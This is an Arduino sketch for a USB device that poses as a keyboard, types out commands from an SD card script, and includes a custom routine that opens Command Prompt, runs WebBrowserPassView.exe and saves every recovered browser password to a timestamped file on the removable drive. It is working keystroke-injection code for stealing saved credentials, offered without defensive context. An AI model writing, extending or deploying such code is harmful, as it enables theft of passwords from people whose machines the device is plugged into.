#include <SPI.h>
#include <SD.h>
#include <string.h>
#include "Keyboard.h"

File myFile;
boolean first = true;
String DEFAULT_FILE_NAME = "script.txt";

void setup() {

  if (!SD.begin(4)) {
    return;
  }
  
  myFile = SD.open(DEFAULT_FILE_NAME);
  if (myFile) {
    Keyboard.begin();
    
    String line = "";
    while (myFile.available()) {
      char m = myFile.read();
      if (m == '\n'){
        Line(line);
        line = "";
        }
        else if((int) m != 13)
        {
          line += m;
        }
    }
    Line(line);
    
    myFile.close();
  } else {
  }

  Keyboard.end();
}

void Line(String l)
{
  int space_1 = l.indexOf(" ");
  if (space_1 == -1)
  {
    Press(l);
  }
  else if (l.substring(0,space_1) == "STRING")
  {
    Keyboard.print(l.substring(space_1 + 1));
  }
  else if (l.substring(0,space_1) == "DELAY")
  {
    int delaytime = l.substring(space_1 + 1).toInt();
    delay(delaytime);
  }
  else if(l.substring(0,space_1) == "REM"){}
  else
  {
      String remain = l;

      while(remain.length() > 0)
      {
        int latest_space = remain.indexOf(" ");
        if (latest_space == -1)
        {
          Press(remain);
          remain = "";
        }
        else
        {
          Press(remain.substring(0, latest_space));
          remain = remain.substring(latest_space + 1);
        }
        delay(5);
      }
  }

  Keyboard.releaseAll();
}


void Press(String b)
{
  if(b.length() == 1)
  {
    char c = b[0];
    Keyboard.press(c);
  }
  else if (b.equals("ENTER"))
  {
    Keyboard.press(KEY_RETURN);
  }
  else if (b.equals("CTRL"))
  {
    Keyboard.press(KEY_LEFT_CTRL);
  }
    else if (b.equals("SHIFT"))
  {
    Keyboard.press(KEY_LEFT_SHIFT);
  }
    else if (b.equals("ALT"))
  {
    Keyboard.press(KEY_LEFT_ALT);
  }
    else if (b.equals("GUI"))
  {
    Keyboard.press(KEY_LEFT_GUI);
  }
    else if (b.equals("UP") || b.equals("UPARROW"))
  {
    Keyboard.press(KEY_UP_ARROW);
  }
    else if (b.equals("DOWN") || b.equals("DOWNARROW"))
  {
    Keyboard.press(KEY_DOWN_ARROW);
  }
    else if (b.equals("LEFT") || b.equals("LEFTARROW"))
  {
    Keyboard.press(KEY_LEFT_ARROW);
  }
    else if (b.equals("RIGHT") || b.equals("RIGHTARROW"))
  {
    Keyboard.press(KEY_RIGHT_ARROW);
  }
    else if (b.equals("DELETE"))
  {
    Keyboard.press(KEY_DELETE);
  }
    else if (b.equals("PAGEUP"))
  {
    Keyboard.press(KEY_PAGE_UP);
  }
    else if (b.equals("PAGEDOWN"))
  {
    Keyboard.press(KEY_PAGE_DOWN);
  }
    else if (b.equals("HOME"))
  {
    Keyboard.press(KEY_HOME);
  }
    else if (b.equals("ESC"))
  {
    Keyboard.press(KEY_ESC);
  }
    else if (b.equals("INSERT"))
  {
    Keyboard.press(KEY_INSERT);
  }
    else if (b.equals("TAB"))
  {
    Keyboard.press(KEY_TAB);
  }
    else if (b.equals("END"))
  {
    Keyboard.press(KEY_END);
  }
    else if (b.equals("CAPSLOCK"))
  {
    Keyboard.press(KEY_CAPS_LOCK);
  }
    else if (b.equals("F1"))
  {
    Keyboard.press(KEY_F1);
  }
    else if (b.equals("F2"))
  {
    Keyboard.press(KEY_F2);
  }
    else if (b.equals("F3"))
  {
    Keyboard.press(KEY_F3);
  }
    else if (b.equals("F4"))
  {
    Keyboard.press(KEY_F4);
  }
    else if (b.equals("F5"))
  {
    Keyboard.press(KEY_F5);
  }
    else if (b.equals("F6"))
  {
    Keyboard.press(KEY_F6);
  }
    else if (b.equals("F7"))
  {
    Keyboard.press(KEY_F7);
  }
    else if (b.equals("F8"))
  {
    Keyboard.press(KEY_F8);
  }
    else if (b.equals("F9"))
  {
    Keyboard.press(KEY_F9);
  }
    else if (b.equals("F10"))
  {
    Keyboard.press(KEY_F10);
  }
    else if (b.equals("F11"))
  {
    Keyboard.press(KEY_F11);
  }
    else if (b.equals("F12"))
  {
    Keyboard.press(KEY_F12);
  }
    else if (b.equals("SPACE"))
  {
    Keyboard.press(' ');
  } 
else if (b.equals("PASSWORDSOFTWARE"))
  {
    TryOpenSoftware();
  } 
}

void loop() {
}



void TryOpenSoftware() {
  char driveLetters[] = {'D', 'E', 'F', 'G', 'H'};
  String cmdCommand = ":\\ && cd \\ && WebBrowserPassView.exe";

    // Initialize random seed
  randomSeed(analogRead(0));

  // Generate a random number for the filename
  long randomNumber = random(1000, 9999);
  
  // Create a "timestamped" filename
 String fileName = "passwords_" + String(randomNumber) + ".txt";

    delay(3000);
  // Open Command Prompt
    Keyboard.press(KEY_LEFT_CTRL);
    Keyboard.press(KEY_ESC);
    Keyboard.releaseAll();
    delay(2000);
    Keyboard.print("Command Prompt");
    delay(2000);
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();

    delay(2000);

    Keyboard.print("E:");
    Keyboard.press(KEY_RETURN);
    delay(500);
    Keyboard.releaseAll();
    delay(1000);

    Keyboard.print("WebBrowserPassView.exe");
    Keyboard.press(KEY_RETURN);
    delay(500);
    Keyboard.releaseAll();
    delay(5000);

//Software OPENS

//Select ALL
//(CTRL + A)
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press('a');
  Keyboard.releaseAll();
  delay(500); // Short delay to ensure action completion

//Save As
//(CTRL + S)
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press('s');
  Keyboard.releaseAll();
  delay(500); // Short delay to ensure action completion

// Now we are in file explorer , move to our E drive, and save the file as Passwords.txt

// Assuming the Save As dialog is open and focused
// First, attempt to jump to the address bar
Keyboard.press(KEY_LEFT_ALT);
Keyboard.press('d');
Keyboard.releaseAll();
delay(500);

// Type the path to the E drive directly
Keyboard.print("E:\\");
Keyboard.press(KEY_RETURN);
Keyboard.releaseAll();
delay(500);

// Wait for the navigation to complete
delay(1000); // Adjust this delay based on system performance

// Now, assuming we are in the correct directory, type the file name

// Type the "timestamped" filenameCommand Prompt

  for (int i = 0; i < fileName.length(); i++) {
      Keyboard.print(fileName[i]);
      delay(50); // Delay between key presses to ensure reliability
  }
delay(500);

// Press Enter to save
Keyboard.press(KEY_RETURN);
Keyboard.releaseAll();
delay(500);

//Keyboard.print("passwords.txt");
//delay(500);
//
//// Press Enter to save
//Keyboard.press(KEY_RETURN);
//Keyboard.releaseAll();
//delay(500);

//// Optional: Close the application if necessary
//Keyboard.press(KEY_ALT);
//Keyboard.press(KEY_F4);
//Keyboard.releaseAll();
//delay(500);


}

void SelectAllAndCopy() {
  // Simulate CTRL+A to select all content
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press('a');
  Keyboard.releaseAll();
  delay(500); // Short delay to ensure action completion

  // Simulate CTRL+C to copy content
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press('c');
  Keyboard.releaseAll();
  delay(500); // Short delay to ensure action completion


  // Take the copies values and create a new text document on the sd card adapter and make it timestamped as the name
}
